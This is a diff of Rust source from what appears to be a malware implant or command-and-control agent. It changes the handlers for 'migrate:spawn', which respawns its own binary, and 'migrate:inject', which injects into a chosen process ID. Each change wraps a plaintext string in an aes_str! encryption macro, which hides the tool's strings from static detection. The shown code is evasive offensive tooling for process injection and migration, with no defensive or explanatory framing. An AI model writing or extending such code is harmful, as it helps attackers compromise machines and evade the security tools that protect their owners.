@@ -36,12 +36,12 @@ pub async fn handle_injection(cmd: String) -> (String, String, i32) {
 
 pub fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> DispatchResult {
     let binary = binary.trim().to_string();
-    let desc = format!("migrate:spawn {}", binary);
+    let desc = format!("{} {}", aes_str!("migrate:spawn"), binary);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
             sink.send_chunk(&aes_str!("[*] Reading self binary...")).await;
             let result = tokio::task::spawn_blocking(move || migrate::migrate_spawn(&binary))
-                .await.unwrap_or_else(|e| Err(format!("Task: {}", e)));
+                .await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task"), e)));
             match result {
                 Ok(msg) => {
                     sink.send_chunk(&msg).await;
@@ -49,11 +49,11 @@ pub fn handle_migrate_spawn(ctx: &HandlerContext, binary: &str, req_id: u64) -> 
                     tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
                     std::process::exit(0);
                 }
-                Err(e) => { sink.send_chunk(&format!("[-] Migration failed: {}", e)).await; (String::new(), e, 1) }
+                Err(e) => { sink.send_chunk(&format!("{}: {}", aes_str!("[-] Migration failed"), e)).await; (String::new(), e, 1) }
             }
         }
     });
-    DispatchResult::Reply(format!("Migration launched as Job {}", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {}", aes_str!("Migration launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
 pub fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> DispatchResult {
@@ -61,12 +61,12 @@ pub fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> D
     if pid == 0 {
         return DispatchResult::Reply(String::new(), aes_str!("Usage: migrate:inject <pid>"), 1, AgentAction::None);
     }
-    let desc = format!("migrate:inject PID {}", pid);
+    let desc = format!("{} {}", aes_str!("migrate:inject PID"), pid);
     let job_id = lock_or_action!(ctx.job_manager, aes_str!("job_manager")).spawn(desc, req_id, move |sink| {
         async move {
-            sink.send_chunk(&format!("[*] Injecting into PID {}...", pid)).await;
+            sink.send_chunk(&format!("{} {}...", aes_str!("[*] Injecting into PID"), pid)).await;
             let result = tokio::task::spawn_blocking(move || migrate::migrate_inject(pid))
-                .await.unwrap_or_else(|e| Err(format!("Task: {}", e)));
+                .await.unwrap_or_else(|e| Err(format!("{}: {}", aes_str!("Task"), e)));
             match result {
                 Ok(msg) => {
                     sink.send_chunk(&msg).await;
@@ -78,7 +78,7 @@ pub fn handle_migrate_inject(ctx: &HandlerContext, args: &str, req_id: u64) -> D
             }
         }
     });
-    DispatchResult::Reply(format!("Migration launched as Job {}", job_id), String::new(), 0, AgentAction::None)
+    DispatchResult::Reply(format!("{} {}", aes_str!("Migration launched as Job"), job_id), String::new(), 0, AgentAction::None)
 }
 
 #[cfg(test)]
